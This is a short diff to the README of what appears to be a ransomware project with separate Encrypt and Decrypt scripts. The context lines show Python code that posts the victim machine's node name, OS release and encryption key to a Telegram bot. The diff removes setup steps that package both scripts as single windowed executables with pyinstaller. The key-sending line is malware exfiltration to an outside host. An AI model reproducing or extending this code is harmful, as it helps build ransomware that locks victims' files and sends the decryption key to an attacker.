@@ -65,14 +65,6 @@ Chat Id<br/>
         requests.post("https://api.telegram.org/bot<your_telegram_api>/sendMessage",
                 data={"chat_id": "<your_telegram_chat_id>", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})
 
-# Setup
-After making the necessary settings.
-```sh
-$ cd Encrypt
-$ pyinstaller encrpt.py --onefile --windowed
-$ cd Decrypt
-$ pyinstaller decrpt.py --onefile --windowed
-```
 
 # Installation
 
